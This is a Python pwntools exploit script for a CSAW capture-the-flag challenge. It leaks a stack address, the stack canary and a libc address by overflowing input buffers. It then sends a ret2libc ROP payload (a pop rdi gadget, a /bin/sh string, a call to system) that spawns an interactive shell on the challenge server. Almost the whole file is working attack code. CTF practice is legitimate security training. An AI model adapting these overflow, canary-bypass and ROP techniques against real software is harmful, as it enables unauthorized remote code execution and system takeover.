from pwn import *

def recvall():
    c = 0
    ret = ""
    while True:
        a = r.recvline(timeout=0.1)
        if a == "":
            c += 1
        ret += a
        if c == 5:
            break
    return ret

r = remote("pwn.chal.csaw.io", 3764)
#r = process("./pwn2")



c = recvall()



r.sendline("1")
r.sendline("E"*55)

recvall()

r.sendline("2")

c = recvall()
n = False
stackleak = ""
for a in c.split("\n"):
    print a
    if n:
        print len(a)
        for d in a:
            stackleak = ("0"*(2-len(hex(ord(d))[2:])) + hex(ord(d))[2:]) + stackleak
        print stackleak
        n = False
    if "EEEEEEEEEEEEEEEEEEEEEEEE" in a:
        n = True

stackleak = int(stackleak, 16)
print ("Stack leak: " + hex(stackleak))



r.sendline("1")

r.sendline("A"*168)

recvall()

r.sendline("2")

c = recvall()
n = False
cookie = "\x00"
for a in c.split("\n"):
    if n:
        for d in a:
            cookie += d
            if (len(cookie) == 8):
                break
        n = False
    if "AAAAAAAAAAAAAAA" in a:
        n = True


r.sendline("1")
r.sendline("C"*183)

recvall()

r.sendline("2")

c = recvall()
n = False
libcleak = ""
for a in c.split("\n"):
    print a
    if n:
        print len(a)
        for d in a:
            libcleak = "0"*(2-len(hex(ord(d))[2:])) + hex(ord(d))[2:] + libcleak
        print libcleak
        n = False
    if "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC" in a:
        n = True

libcleak = int(libcleak, 16) - 240
print (hex(libcleak))












libcbase = libcleak - 0x20740#0x3c410 #0x000000000003a280#
gadget = 0x0000000000400ea3 # pop rdi ; ret

system = libcbase + 0x0000000000045390 #0x046590 #0x0000000000045390#

binsh = stackleak - 0x60 #libcbase + 0x180503 #0x18cd17#

print "Libcbase: " + hex(libcbase)

payload = "/bin/sh\x00" + "A"*160 + cookie
payload += "B"*8
payload += p64(gadget)
payload += p64(binsh)
payload += p64(system)

print len(payload)

recvall()

r.sendline("1")
r.sendline(payload)


r.interactive()